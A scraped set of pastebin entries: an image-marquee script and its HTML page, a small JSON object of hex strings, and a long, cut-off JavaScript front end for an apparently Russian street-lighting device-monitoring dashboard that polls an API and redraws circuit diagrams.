    }

    // start
    for (let i = 0; i < length; i++) {
        createImg(i)
    }
}


// TEST
createInfiniteImageMarquee('.image-marquee', {
    height: '300px',
    gap: 20
})"
7y2f0W0Y,Marquee-HTML,dugalcedo,HTML,Wednesday 28th of May 2025 07:33:20 AM CDT,"<!DOCTYPE html>
<html lang=""en"">
<head>
    <meta charset=""UTF-8"">
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
    <title>Document</title>
    <script src=""./script.js"" defer></script>
    <style>
        .marquee-img {
            border-radius: 15px;
            box-shadow: 2px 2px 5px rgba(0, 0, 0, 0.4);
        }
    </style>
</head>
<body>
    <div class=""image-marquee"">
        <img src=""https://picsum.photos/seed/i0/500/500"" alt=""random image"">
        <img src=""https://picsum.photos/seed/i1/500/500"" alt=""random image"">
        <img src=""https://picsum.photos/seed/i2/500/500"" alt=""random image"">
        <img src=""https://picsum.photos/seed/i3/500/500"" alt=""random image"">
        <img src=""https://picsum.photos/seed/i4/500/500"" alt=""random image"">
        <img src=""https://picsum.photos/seed/i5/500/500"" alt=""random image"">
        <img src=""https://picsum.photos/seed/i6/500/500"" alt=""random image"">
    </div>
</body>
</html>"
SxJWFUhd,dataNone,TestGuy1,JSON,Wednesday 28th of May 2025 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'a4c53c265baac866754d72c125fd9f3826fc48aba8dda01f98e37cabf3434024f8d5d7696190f7c8454645d20639eb3fc498fae719547701e72217d3a6138e8d98702a71c87d3144cd0471086fd73593f1820869a24bd7a850c8fd0e2f2c4b8ea96272d3dbb934c96bfb5d9427e78e1bf9d6b419d78ae41abb79d19d222a26cd',
  otherdata: [
    '1d910cd517546cba9209d95d23640e44',
    '0a8663c51450ab41611beb69f60c3a0f',
    'ff036f3d39d2026ebd7997a207117385',
    'a6cd32ee8b081c4a5b02116c16e147cc',
    '21d781c71e80238fa3680b359d3e14fe',
    'b84fb525158a86032787b6a9f53de99b',
    '03b89c2128bed6f04f1f380e8d9754fc',
    '343bb65572668e10a1dfb27daaa422a5'
  ]
}"
KKD2Y3eG,Untitled,eqeqwan21,JavaScript,Wednesday 28th of May 2025 05:25:19 AM CDT,"//v13_14 альтернатиная мнемосхема_маскировка команд
//v11++фото заголовки со ссылками																			  
""use strict"";
let hulla = new hullabaloo();
let box = null;
let circuit = null;
let stlog = null;
let dayly = null;
let lastip = null;
let lastmeter = null;
//Антон: отображение команд с учетом маски
let deviceObj = null;

let dt = null, mdt = null;
let liveMode = true;
let renewTimer = null;
let dtdt = null;
let commands = null;
var gallery_ro = true;

let get = parseQuery(window.location.search);
moment.locale(environment.language || window.navigator.userLanguage || window.navigator.language);


$(async function () {
  $(""#btnLive"").prop(""disabled"", true);
  let result;
  let userTown;
  if (environment.login_name.indexOf(""_"") !== -1) {
    userTown = '&town=' + environment.login_name.split('_')[0].toLowerCase()
  } else {
    userTown = ''
  }
  try {
    result = await $.ajax({
      url: environment.base_url + ""/"" + '?do=api&fn=devices&id=' + get['id'] + userTown,
      type: 'GET',
      dataType: ""json""
    });
//Антон: отображение команд с учетом маски
    deviceObj = result;
  } catch (error) {
    console.error(error);
    $(""#content"").html(""<h2>Device was not loaded</h2>"");
    return;
  }


  if (result.rows.length > 0)
    box = result.rows.slice(0)[0];
  else {
    $(""#content"").html(""<h2>Device not found</h2>"");
    return;
  }

  if (box.DimProfile_id !== null) {
    try {
      dayly = await $.ajax({
        url: environment.base_url + ""/"" + '?do=api&fn=dimdetail&now&id=' + box.DimProfile_id,
        type: 'GET',
        dataType: ""json""
      });
    } catch (error) {
      console.error(error);
    }
  }

  if (box.Type == 2)
    $(""#strongState"").text(i18next.t(""Brightness""));

  drawBoxInfo();
  try {
    result = await $.ajax({
      url: environment.base_url + ""/"" + '?do=api&fn=circuit&id=' + get['id'],
      type: 'GET',
      dataType: ""json""
    });

  } catch (error) {
    console.error(error);
    $(""#content"").html(""<h2>Pattern was not loaded</h2>"");
    return;
  }

  if (result.rows.length > 0)
    circuit = result.rows[0];
  else
    console.log(""Pattern not found"");

  let svg = """";
  if (circuit !== null) {
    let qs = circuit.qs;
    if (environment.language !== ""en"") {
      qs = qs.replace(/S/gi, ""K"");
    }

    try {
      svg = await $.ajax({
        url: environment.base_url + `/images/galbox.svg?v=${config.version}&noxml&cnf=` + qs,
        type: 'GET',
        processData: false
      });
      $(""#circuit"").html(`${svg}`);
      if (box.Name?.startsWith(""TL"")) await attachBackground();
    } catch (error) {
      console.error(error);
    }
  }

  stdatatable();
  meterdatatable();

  setTimeout(renew, 1);
  setTimeout(iprenew, 10);

  $(""#circuit svg"").addClass(""col-12"");
  $(""#circuit svg"").addClass(""p-0"");
  //Ссылки в зоголовках ""статистика"" и ""журнал состояния"" в форме Объект
  $(""#statlink"").attr(""href"", `${environment.base_url}/inlog?device=${get['id']}`);
  $(""#stlink"").attr(""href"", `${environment.base_url}/stlog?device=${get['id']}`);
  if (box.Smart) {
    try {
      result = await $.ajax({
        url: environment.base_url + ""/"" + '?do=api&fn=ServerCommand&type=1,3&DeviceType=' + box.Type,
        type: 'GET',
        dataType: ""json""
      });

    } catch (error) {
      console.error(error);
      return;
    }
    commands = result.rows;
    $(""#cmd"").find('option').remove();

    for (let key in commands) {
      if (commands[key].Letter == ""F"")
        continue;
      $(""#cmd"").append($(""<option></option>"")
          .attr(""value"", commands[key].id)
          .text(i18next.t(commands[key].Name)));
    }
  } else {
    $(""#manualDiv"").hide();
  }
//добавление картинки светильника из галлереи с проверкой её наличия, иначе - по умолчанию
  if (box.Type !== 1) {
    $.ajax({
      url: `${environment.base_url}/?do=api&fn=picture_list&Devices_id=${get['id']}&order=ASC&limit=1`,
      type: 'GET',
      dataType: ""json"",
      success: function (result) {
        if (result['list'].length > 0) {
          $(""#circuit"").html('<img class=""img-fluid"" src=""' + result['list'][0].src + '"">');
        } else {
          $(""#circuit"").html(`<img class=""img-fluid"" src=""${environment.base_url}/images/lamp.png"">`)
        }
      }
    });
    // $(""#circuit"").html(`<img class=""img-fluid"" src=""${environment.base_url}/images/lamp.png"">`);
  }

  $("".picture"").click(() => {
    galleryOpen(get['id'])
  });
  /*
  let pl = await getPictureList(get['id'], 'desc', 100);
  if(pl.length == 0) {
    $("".picture"").click( ()=>{galleryOpen(get['id'])});
  } else {
    let html="""";
    let i=0;
    pl.forEach(el => {
      let title = """";
      let opt = {month: ""long"", day:""numeric"", year:""numeric""};
      let separ="", "";
      let opt2= {hour:""numeric"", minute:""numeric""};
      let disp="""";

      if(el.Exiftime!==null) {
        let dda = el.Exiftime.split("" "");
        if(dda.length==2) {
          let dds = dda[0].replaceAll("":"",""-"") + "" "" + dda[1]+""Z"";
          let dd = new Date(dds);

          if(!(dd===NaN) && !dd!=""Invalid Date"") {
            disp = ""<i class='fa fa-camera'></i>&nbsp;"" + dd.toLocaleDateString(environment.language, opt) + separ +
            dd.toLocaleTimeString(environment.language, opt2);
          }
        }
      }

      let dd = new Date(el.Loaded+""Z"");
      if(!(dd===NaN) && !dd!=""Invalid Date"") {
        if(disp!="""")
          disp+=""<br>"";
        disp += ""<i class='fa fa-upload'></i>&nbsp;"" + dd.toLocaleDateString(environment.language, opt) + separ +
        dd.toLocaleTimeString(environment.language, opt2);
      }

      title = `data-container=""body"" data-html=""true"" data-placement=""top"" data-toggle=""tooltip"" title=""${disp}""`;

      html += `<div ${title}><img onclick=""galleryOpen(${get['id']}, ${i})"" class=""border border-primary rounded imgpic"" width=""60px"" height=""60px"" src=""${el.src}&thumb""></div>`;
      i++;
    });
    $(""#pg"").html(html);
    $('[data-toggle=""tooltip""]').tooltip({
      boundary:""viewport"",
      html: true
    });
  }
  */

});

async function runCmd() {
  $(""#btnCmd"").prop(""disabled"", true);
  setTimeout(() => $(""#btnCmd"").prop(""disabled"", false), 1500);
  let srvcmd = {};

  srvcmd.cmd = parseInt($(""#cmd"").val());
  let selcmd = commands.find(x => x.id == srvcmd.cmd);
  let cmdtext = i18next.t(selcmd.Name);

  srvcmd.devs = [box.id];

  let result = null;
  try {
    result = await $.ajax({
      url: environment.base_url + ""/"" + '?do=api&fn=makecalls',
      data: JSON.stringify(srvcmd),
      type: 'PUT',
      contentType: ""application/json; charset=utf-8"",
      dataType: ""json""
    });

  } catch (error) {
    console.error(error);
    hulla.send(i18next.t(""Device control error""));
    return false;
  }

  if (result.success) {
    switch (result.queued) {
      case 0:
        hulla.send(i18next.t(""Command not queued""));
        break;
      case 1:
        hulla.send(`${i18next.t(""Command"")} ""${cmdtext}"" ${i18next.t(""queued"")}`, ""success"");
        break;
      default:
        hulla.send(`${cmdtext} - ${i18next.t(""Command queued for multiple devices"")} (${result.queued})`, ""success"");
        break;
    }
  } else {
    hulla.send(i18next.t(""An error occurred while adding commands to the queue""));
    console.log(result);
  }

  return false;
}

let pbox = null, plines = null;

async function drawBoxInfo() {
  $(""#Phone"").html(number10html(box.Phone));
//Добавление строки ""Серийный номер""	
  for (let fld of [""CustomNum"", ""Name"", ""sn"", ""DimProfile_Name"", ""Station"", ""ControlTime""]) {
    let val = box[fld];
    if (val !== null) {
      if (fld == ""ControlTime"")
        $(""#"" + fld).text(val.substr(0, 5));
      else
        $(""#"" + fld).text(val);
    }
  }
  if (box.Station == null && box.Lines_id) {
    //let pbox =null, plines = null;
    try {
      pbox = await $.ajax({
        url: environment.base_url + ""/"" + '?do=api&fn=devices&id=' + box.Box_id,
        type: 'GET',
        dataType: ""json""
      });

    } catch (error) {
      console.error(error);
      return;
    }
    try {
      plines = await $.ajax({
        url: environment.base_url + ""/"" + '?do=api&fn=lines&id=' + box.Box_id,
        type: 'GET',
        dataType: ""json""
      });

    } catch (error) {
      console.error(error);
      return;
    }

    if (pbox && plines) {
      let ln = plines.rows.find(x => x.id == box.Lines_id)
      let txt = ln.Num.toString().padStart(2, ""0"") + "". "" + i18next.t(appdata.LinesType.find(x => x.id == ln.Type).Name);

      if (ln.Switch > 0)
        txt += "" "" + i18next.t(appdata.Switches.find(x => x.id == ln.Switch).Name);
      if (ln.Phase > 0)
        txt += "", "" + i18next.t(""Phase"") + "" "" + appdata.Phases.find(x => x.id == ln.Phase).Name;

      $(""#Station"").html(`<a target=""obj${box.Box_id}"" href=""${environment.base_url}/obj?id=${box.Box_id}"" id=""aStation""></a>, ${txt}`);
      $(""#aStation"").text(`${i18next.t(""Box"")} № ${pbox.rows[0].CustomNum}`);
    }
  }
  $(""#Mode"").text(i18next.t(appdata.AutoModes.find(x => x.id == box.Mode).Name));
  $(""#Location"").text(makeAddress(box));

  $(""#shiftdiv"").hide();

  daylyTable();
}


function daylyTable() {
  if (dayly == null)
    return;

  let drw = dayly.rows;
  let aShift = null;
  if (box.PardShift)
    aShift = box.PardShift.split("","");

  let str1 = ""<tr>"", str2 = ""<tr>"", str3 = ""<tr>"";
  for (let i = 0; i < config.pard_maxvalue; i++) {
    let time = '', val = '';
    if (!(drw[i] === undefined)) {

      time = drw[i].Time.substr(0, 5);
      if (box.Type == 2) //lamp
        val = """" + drw[i].DimValue + ""%"";
      else
        val = SwitchStateForMask(drw[i].DimValue);//Антон: отображение команд с учетом маски
    }
    if (aShift) {
      let tt = '';
      if (aShift[i]) {
        let tti = parseInt(aShift[i]);
        let sign = """";
        if (tti < 0)
          sign = ""-"";
        if (tti > 0)
          sign = ""+"";
        tti = Math.abs(tti);
        let min = tti % 60;
        let hr = (tti - min) / 60;

        tt = `${sign}${new Intl.NumberFormat(environment.language, {minimumIntegerDigits: 2}).format(hr)}:${new Intl.NumberFormat(environment.language, {minimumIntegerDigits: 2}).format(min)}`;
      }
      str3 += `<td class=""text-center"">${tt}</td>`;
    }


    str1 += `<td class=""text-center"">${time}</td>`;
    str2 += `<td class=""text-center"">${val}</td>`;
  }
  str1 += ""</tr>"";
  str2 += ""</tr>"";
  $(""#dimDetail"").append(str1);

  if (aShift) {
    str3 += ""</tr>"";
    $(""#dimDetail"").append(str3);
  }
  $(""#dimDetail"").append(str2);
}

let loadfail = 0;

async function dataload() {
  let url = environment.base_url + ""/"" + ""?do=api&fn=stlog&limit=64&device="" + get['id'];
  let result, ret = false;
  try {
    result = await $.ajax({
      url: url,
      type: 'GET',
      dataType: ""json"",
      cache: false
    });
  } catch (error) {
    console.log(""Error: "", error);

    if (error.status == 401) //unautorized
      window.location = environment.base_url + ""/"" + ""?do=login&b="" + encodeURIComponent(window.location);

    loadfail++;
    if (stlog === null)
      $(""#content"").html(""<h2>Log was not loaded</h2>"");
    else if (loadfail > 1) {
      hulla.send(i18next.t(`No connection to the server (${error.statusText})`));
      loadfail = 0;
    }
    return ret;
  }
  loadfail = 0;
  if (stlog == null || stlog.timestamp != result.timestamp) {
    stlog = result;
    ret = true;
  }

  return ret;
}


async function ipload() {
  let url = environment.base_url + ""/"" + ""?do=api&fn=lastip&device="" + get['id'];
  let result, ret = false;
  try {
    result = await $.ajax({
      url: url,
      type: 'GET',
      dataType: ""json"",
    });
  } catch (error) {
    console.log(""Error: "", error);
    return ret;
  }
  if (lastip == null || lastip.timestamp != result.timestamp) {
    lastip = result;
    ret = true;
  }

  return ret;
}

async function meterload() {
  let url = environment.base_url + ""/"" + ""?do=api&fn=lastmeter&device="" + get['id'];
  let result, ret = false;
  try {
    result = await $.ajax({
      url: url,
      type: 'GET',
      dataType: ""json"",
    });
  } catch (error) {
    console.log(""Error: "", error);
    return ret;
  }
  if (lastmeter == null || result.timestamp != lastmeter.timestamp) {
    lastmeter = result;
    ret = true;
  }

  return ret;
}


async function renew() {
  // let nextt = 1000;
  // let isnew = await dataload();
  // if (isnew) {
  //   onlogchane();
  //   nextt = 2000;
  // }
  // setTimeout(renew, nextt);
  if (!liveMode) return;
  let nextt = 1000;
  const isnew = await dataload();
  if (isnew) {
    onlogchane();
    nextt = 2000;
  }
  renewTimer = setTimeout(renew, nextt);
}

async function iprenew() {

  let nextt = 1000;
  let isnew = await ipload();

  if (isnew) {
    if (lastip !== null && lastip.rowCount > 0) {
      let li = lastip.rows[0];
      let m = moment(li.unixtime * 1000);
      $(""#iptime"").text(m.format(""L LT""));
      $(""#ipdata"").text(li.Msg);
      $(""#divstat"").show();
    } else
      $(""#divstat"").hide();

    let isnewmeter = await meterload();
    if (isnewmeter) {
      if (lastmeter !== null && lastmeter.rowCount > 0) {
        let lm = lastmeter.rows[0];

        let dd = new Date(lm.Timestamp + ""Z"");
        let disp = dd.toLocaleDateString(environment.language) + "" "" +
            dd.toLocaleTimeString(environment.language, {hour: ""numeric"", minute: ""numeric""});
        $(""#metertime"").text(disp);
        $(""#meterlink"").attr(""href"", `${environment.base_url}/meterlog?device=${get['id']}`);
//Открытие новой вкладки для ""Показания учета""
        //$(""#meterlink"").attr(""target"", `meterlog${get['id']}`);
        mdt.ajax.reload();
        $(""#meterstat"").show();
      } else
        $(""#meterstat"").hide();
    }

    nextt = 5000;
  }
  setTimeout(iprenew, nextt);
}


async function onlogchane() {
  if (dt != null) {
    dt.ajax.reload();
    $('[data-toggle=""tooltip""]').tooltip('dispose');
    $("".tooltip"").remove();
    $('[data-toggle=""tooltip""]').tooltip();
  }
  let result = null;

  try {
    result = await $.ajax({
      url: environment.base_url + ""/"" + ""?do=api&fn=states&Devices_id="" + get['id'],
      type: 'GET',
      dataType: ""json""
    });
  } catch (error) {
    console.error(error);
  }

  if (result !== null && result.rows.length > 0) {
    let state = result.rows[0];
    setSvgstate(state);
    setTextstate(state);
  }
}

function setTextstate(state) {
  let m = moment(state.unixtime * 1000);
  $(""#StateTime"").text(m.format(""LT, L""));
  if (box.Type == 2)
    $(""#SwState"").text("""" + state.State + ""%"");
  else
    $(""#SwState"").text(SwitchStateForMask(state.State));//Антон: отображение команд с учетом маски
  let mode = state.Mode == 4 ? ""Manual"" : ""Auto"";
  mode = i18next.t(mode);
  if (state.Mode == 1)
    mode += "", "" + box.DimProfile_Name;
  $(""#CurrentMode"").text(mode);

  let door = i18next.t(""Closed"");
  if (!state.Door)
    door = '<span class=""text-danger"">' + i18next.t(""Open"") + ""</span>"";
  $(""#DoorStatus"").html(door);


  let sync = i18next.t(""Synced"");
  if (state.Ous)
    sync = '<span class=""text-danger"">' + i18next.t(""Out of sync"") + ""</span>"";
  $(""#SyncStatus"").html(sync);

}

function setSvgstate(state) {

  let onoff = SwitchState(state.State);

  const ruge = ""#ecabab"";
  const salat = ""#abecab"";

  const errorColor = state.Trouble == STATE_ERROR_UNKNOWN ? ruge : ""red"";
  const greenColor = state.Trouble == STATE_ERROR_UNKNOWN ? salat : ""green"";

  //const phasecolor = state.Power?""green"":ruge;
  let aphst = [];
  for (let i = 0; i < 3; i++) {
    let plet = String.fromCharCode(""A"".charCodeAt() + i);
    let phst = state.Power & (1 << i);
    aphst[i] = phst;
    let phasecolor = phst ? greenColor : errorColor;
    $(`#phase_${plet}`).css(""stroke"", phasecolor);
//V11
    $(""#Volt"" + i).text(plet);
    if (state.PhaseV) {
      let aVolt = JSON.parse(state.PhaseV);
      if (aVolt[i] !== null && aVolt[i] > 1)
        $(""#Volt"" + i).text(aVolt[i]);
    }
  }
  //$("".phase"").css(""stroke"",phasecolor);


// КОНТАКТОРЫ
  for (let i = 1; i <= 4; i++) {
    let swtrouble = state.Trouble & (1 << (i - 1)); 	//аварийность контактора
    let altsw = state.Trouble & (1 << (i + 27)); 		//альтернативное включение контактора
    let on = (onoff[i - 1] !== '0'); 					// значение управления on/off && aphst[0]; 20.07.21 - remove Phase A falsification
    // Команда на включение ON
    if (on) {
      $(`.S${i}_on`).attr(""visibility"", ""visible"");		//видимость состояния on
      $(`.S${i}_off`).attr(""visibility"", ""hidden"");		//скрыть состояние off
      $(`.S${i}_onoff`).attr(""visibility"", ""hidden"");	//скрыть состояние onoff
      $(`.S${i}_offon`).attr(""visibility"", ""hidden"");	//скрыть состояние offon
      let swc = ""green"";
      $(`#S${i}_rect1`).css(""fill"", ""#AFEEEE"");			// левый прямоугольник (голубой)
      $(`#S${i}_rect2`).css(""fill"", swc);				// правый прямоугольник ""зеленый""
      $(`#S${i}_tilda`).css(""stroke"", swc);				//цвет контура синусоиды ""зеленый""
      $(`#S${i}_tilda`).css(""fill"", swc);				//цвет заполнения синусоиды ""зеленый""
      $(`.fuse_S${i}`).css(""fill"", swc);					//предохранители под напряжением ""зеленые""
      //Отсутствие фазы «А»
      if (!aphst[0]) {
        $(`.S${i}_off`).attr(""visibility"", ""hidden"");		// не видимость контактора, как Off
        $(`.S${i}_on`).attr(""visibility"", ""hidden"");		//не видимость контактора, как ON
        $(`.S${i}_onoff`).attr(""visibility"", ""visible"");	//видимость состояния onoff
        $(`.S${i}_offon`).attr(""visibility"", ""hidden"");	//скрыть состояние offon
        swc = salat;
        $(`#S${i}_rect1`).css(""fill"", ""#AFEEEE"");			// левый прямоугольник ""голубой""
        $(`#S${i}_rect2`).css(""fill"", swc);				// правый прямоугольник ""салатный""
        $(`#S${i}_tilda`).css(""stroke"", ""white"");			//белый синус
        $(`#S${i}_tilda`).css(""fill"", ""white"");			//белый синус
        $(`.fuse_S${i}`).css(""fill"", ""white"");				//предохранители ""белые""
        if (altsw) {											//если альтернативно-включенный контактор
          $(`.S${i}_onoff`).attr(""visibility"", ""hidden"");	//не видимость состояния onoff
          $(`.S${i}_offon`).attr(""visibility"", ""visible"");	//видимость состояния offon
          $(`#S${i}_rect2`).css(""fill"", ""red"");				// правый прямоугольник
          $(`.fuse_S${i}`).css(""fill"", ""green"");				//предохранители под напряжением ""зеленые""_07_09
        }
      }
      //аварийность контактора
      if (swtrouble) {
        $(`.S${i}_onoff`).attr(""visibility"", ""visible"");	// видимость контактора, как onoff
        $(`.S${i}_offon`).attr(""visibility"", ""hidden"");	//скрыть состояние offon
        $(`.S${i}_off`).attr(""visibility"", ""hidden"");		// не видимость контактора, как Off
        $(`.S${i}_on`).attr(""visibility"", ""hidden"");		//не видимость включенного контактора
        $(`#S${i}_rect1`).css(""fill"", errorColor);			// левый прямоугольник ""красный""
        $(`#S${i}_rect2`).css(""fill"", salat);				// правый прямоугольник ""салатный""
        $(`#S${i}_tilda`).css(""stroke"", ""white"");			//белый синус
        $(`#S${i}_tilda`).css(""fill"", ""white"");			//белый синус
        $(`.fuse_S${i}`).css(""fill"", ""white"");				//предохранители ""белые""
      }
    }
    // Команда на выключение OFF
    else {
      $(`.S${i}_on`).attr(""visibility"", ""hidden"");		//скрыть состояние ON
      $(`.S${i}_onoff`).attr(""visibility"", ""hidden"");	//скрыть состояние onoff
      $(`.S${i}_offon`).attr(""visibility"", ""hidden"");	//скрыть состояние offon
      $(`.S${i}_off`).attr(""visibility"", ""visible"");		//показать состояние OFF
      $(`#S${i}_rect2`).css(""fill"", ""white"");			// правый прямоугольник ""белый""
      $(`#S${i}_rect1`).css(""fill"", ""#AFEEEE"");			// левый прямоугольник голубой
      $(`#S${i}_tilda`).css(""stroke"", ""green"");			//цвет контура синусоиды
      $(`#S${i}_tilda`).css(""fill"", ""green"");			//цвет заполнения синусоиды
      $(`.fuse_S${i}`).css(""fill"", ""white"");				//предохранители
      // Отсутствие фазы А
      if (!aphst[0]) {
        $(`#S${i}_tilda`).css(""stroke"", ""white"");	//белый синус
        $(`#S${i}_tilda`).css(""fill"", ""white"");
      }	//белый синус
      // Авария контактора
      if (swtrouble) {
        $(`#S${i}_rect1`).css(""fill"", errorColor);		// левый прямоугольник красный
        $(`#S${i}_tilda`).css(""stroke"", ""white"");		//белый синус
        $(`#S${i}_tilda`).css(""fill"", ""white"");
      }		//белый синус
      // Альтернативное включение
      if (altsw) {										//если есть альтернативно-включенный контактор
        $(`.S${i}_off`).attr(""visibility"", ""hidden"");
        $(`.S${i}_offon`).attr(""visibility"", ""visible"");
        $(`#S${i}_rect2`).css(""fill"", ""red"");			// правый прямоугольник красный
        $(`.fuse_S${i}`).css(""green"");				//предохранители под напряжением ""зеленые""_07_09
      }
    }
  }

//ПРЕДОХРАНИТЕЛИ	
  for (let i = 0; i < 3; i++)
    if (!aphst[i])
      $(`.fuse_P${i}`).css(""fill"", ""none"");

//V10__Отображение значений напряжения на линиях/предохранителях	
  let volt = null;
  try {
    volt = JSON.parse(state.Voltage);
  } catch (e) {

  }
//V11	
  $('[id^=""fuse_""]').find(""title"").remove();
  for (let i = 1; i <= 24; i++) {
    let ftrouble = state.Trouble & (1 << (i + 3));
    $(`.fuse_${i}_rect`).attr(""visibility"", ""hidden""); 	//V14 	Не видимость знака стрелок
    if (volt) {
      let fVolt = volt[i - 1];
      if (fVolt) {
        $(`#fuse_${i}_rect`).css(""fill"", ""green"");
        let titlestr = fVolt > 1 ? fVolt + ""V"" : ""⚡"";
        let title = document.createElementNS(""http://www.w3.org/2000/svg"", ""title"");
        title.textContent = titlestr;
//V11				
        $(`#fuse_${i}`).append(title);
      } else
        $(`#fuse_${i}_rect`).css(""fill"", ""white"");

//V14 окраска встречки градиентом ""зеленого"" и символ ""стрелки"" 
      if (ftrouble && fVolt) {
        $(`#fuse_${i}_rect`).css(""fill"", ""url(#MyGradient)"");
        $(`.fuse_${i}_rect`).attr(""visibility"", ""visible""); 	// видимость знака стрелок
      }

//V14  окраска пониженного напряжения градиентом2 ""зеленого"" 
      if (fVolt < 180 && fVolt > 30) {
        $(`#fuse_${i}_rect`).css(""fill"", ""url(#MyGradient2)"");
        $(`.fuse_${i}_rect`).attr(""visibility"", ""hidden""); 	// не видимость знака стрелок
      }

      if (ftrouble && !fVolt)
        $(`#fuse_${i}_rect`).css(""fill"", errorColor);

    }

    //else {
    //if(ftrouble)
    //$(`#fuse_${ i }_rect`).css(""fill"",errorColor);}

  }
}

function SwitchState(num) {
  if (num === null)
    return ""-"";

  num = Math.min(num, 0b1111);

  return num.toString(2).padStart(""4"", ""0""); //For robot
}

//Антон: отображение команд с учетом маски
function SwitchStateForMask(num) {
  if (num === null)
    return ""-"";
  let maskCommand = box ? box.Mask_Command : ''
  if (!maskCommand) {
    num = Math.min(num, 0b1111);

    return num.toString(2).padStart(""4"", ""0"");
  }
  let len = maskCommand ? maskCommand.length : 4;

  let binStr = num.toString(2).padStart(len, ""0"");

  let result = """";
  for (let i = 0; i < len; i++) {
    if (maskCommand[i] === ""1"") {
      result += binStr[i];
    }
  }
  return result;
}

function meterdatatable() {
  mdt = $('#meterlog').DataTable({
    ""ajax"": function (data, callback, settings) {
      let dt = [];
      if (lastmeter !== null)
        dt = lastmeter.rows;
      callback({data: dt});
    },
    ""info"": false,
    ""rowId"": ""id"",
    ""language"": datatables_locale,
    ""paging"": false,
    ""ordering"": false,
    ""searching"": false,
    ""scrollX"": true,
    ""columns"": [
      {
        ""data"": ""Tag"",
        render: function (data, type, row) {
          return i18next.t(""msg_meter_"" + data);
        }
      },
      {
        ""data"": ""Value"", className: 'text-right',
        render: function (data, type, row) {
          let tag = appdata.Meter[row.Tag];
          if (tag.type == ""decimal"") {
            let num = parseFloat(data);
            if (type == ""export"")
              return num;
            return Intl.NumberFormat(environment.language, {minimumFractionDigits: 3}).format(num);
          }
          return data;
        }
      },
    ],
  });

  mdt.on(""draw"", function () {
    $('[data-toggle=""tooltip""]').tooltip();
  });

  mdt.on(""init"", function () {
    $('[data-toggle=""tooltip""]').tooltip();
  });
}

function stdatatable() {

  dt = $('#stlog').DataTable({
    ""ajax"": function (data, callback, settings) {
      if (stlog !== null)
        callback({data: stlog.rows});
    },
    ""info"": false,
    ""rowId"": ""id"",
    ""language"": datatables_locale,
    ""paging"": false,
    ""ordering"": false,
    ""searching"": false,
    ""scrollX"": true,
    ""scrollY"": ""27rem"",
    ""scrollCollapse"": true,
    ""deferRender"": true,

    ""columns"": [
      {""data"": ""id"", visible: false},
      {
        ""data"": ""Timestamp"",
        render: function (data, type, row) {
          if (type == ""display"") {
            let m = moment(row.unixtime * 1000);
            let td = moment();
            let fs = ""L LT"";
            if (td.isSame(m, 'd'))
              fs = ""LT"";
            let tz = row.tz.charAt(0) == ""-"" ? """" : ""+"" + row.tz;
            let stime = data + "" "" + tz;
            return `<span data-toggle=""tooltip"" title=""${stime}"">${m.format(fs)}</span>`;
          }
          return data;
        }
      },

      {
        ""data"": ""Mode"",
        render: function (data, type, row) {
          let strm = i18next.t(""Unmanaged"");
          if (row.Smart)
            strm = i18next.t(appdata.AutoModes.find(x => x.id == data).Name);

          return strm;
        }
      },

      {
        ""data"": ""State"",
        ""className"": ""text-center"",  //Антон: центровка отображения команд с учетом маски
        render: function (data, type, row) {
          let str = data + ""%"";
          if (row.Type == 1) {//Box
            str = SwitchStateForMask(data);//Антон: отображение команд с учетом маски
          }
          return str;
        }

      },
      {
        ""data"": ""Sip"",
        ""className"": ""text-center text-nowrap"",
        render: function (data, type, row) {
          if (type == ""display"") {
            let ret = """";
            if (row.Power >= 7 || (row.Power && box.Type == 2))
              ret = `<span class=""fa fa-plug text-success"" data-toggle=""tooltip"" title=""${i18next.t('Power Ok')}""></span>&nbsp;`;
            else {
              let title = i18next.t('Power Fail');
              title += "" ("" + reverseString(row.Power.toString(2).padStart(3, ""0"")) + "")"";

              ret = `<span class=""fa fa-plug text-danger"" data-toggle=""tooltip"" title=""${title}""></span>&nbsp;`;
            }

            if (!row.Trouble)
              ret += `<span class=""fa fa-check-circle text-success"" data-toggle=""tooltip"" title=""${i18next.t('Facility is Ok')}""></span>&nbsp;`;
            else
              ret += `<span class=""fa fa-exclamation-triangle text-danger"" data-html=""true"" data-toggle=""tooltip"" title=""${errDecode(row.Trouble, box.Type)}""></span>&nbsp;`;


            if (data)
              ret += `<span class=""fa fa-phone-square text-success"" data-toggle=""tooltip"" title=""${i18next.t('SIP is Ok')}""></span>&nbsp;`;
            else
              ret += `<span class=""fa fa-phone-square text-danger"" data-toggle=""tooltip"" title=""${i18next.t('SIP fault')}""></span>&nbsp;`;

            if (row.Ip)
              ret += `<span class=""fa fa-wifi text-success"" data-toggle=""tooltip"" title=""${i18next.t('IP is Ok')}""></span>&nbsp;`;
            else
              ret += `<span class=""fa fa-wifi text-danger"" data-toggle=""tooltip"" title=""${i18next.t('IP fault')}""></span>&nbsp;`;

            if (!row.Timeallert)
              ret += `<span class=""fa fa-clock-o text-success"" data-toggle=""tooltip"" title=""${i18next.t('Clock is Ok')}""></span>&nbsp;`;
            else
              ret += `<span class=""fa fa-clock-o text-danger"" data-toggle=""tooltip"" title=""${i18next.t('Clock error')}""></span>&nbsp`;

            if (row.Controller)
              ret += `<span class=""fa fa-microchip text-success"" data-toggle=""tooltip"" title=""${i18next.t('Controller is OK')}""></span>&nbsp`;
            else
              ret += `<span class=""fa fa-microchip text-danger"" data-toggle=""tooltip"" title=""${i18next.t('Controller error')}""></span>&nbsp`;

            if (row.Door)
              ret += `<span class=""fa fa-lock text-success"" data-toggle=""tooltip"" title=""${i18next.t('Case closed')}""></span>&nbsp`;
            else
              ret += `<span class=""fa fa-unlock text-danger"" data-toggle=""tooltip"" title=""${i18next.t('Case open')}""></span>&nbsp`;

            if (row.Ous)
              ret += `<span class=""fa fa-refresh text-danger"" data-toggle=""tooltip"" title=""${i18next.t('Out of sync')}""></span>`;
            else
              ret += `<span class=""fa fa-refresh text-success"" data-toggle=""tooltip"" title=""${i18next.t('Synced')}""></span>`;

            return ret;

          }
          return data;
        }
      },


      {
        ""data"": ""DimProfileName"",
        ""className"": ""text-nowrap"",
        render: function (data, type, row) {
          let strd = """";
          let title = """"
          if (row.Smart) {

            if (!(row.IncomingLog_id === null)) {
              title = i18next.t(""Notification"");
              if (!(row.Status_name === null))
                strd = escapeQuote(i18next.t(row.Status_Name)) + "" "";
              if (!(row.RemoteIP === null)) {
                strd = i18next.t(""Statistics"") + "" "";
                title = ""IP: "" + row.RemoteIP;
              }
              strd += ""(&lArr;)"";

              if (type == ""display"")
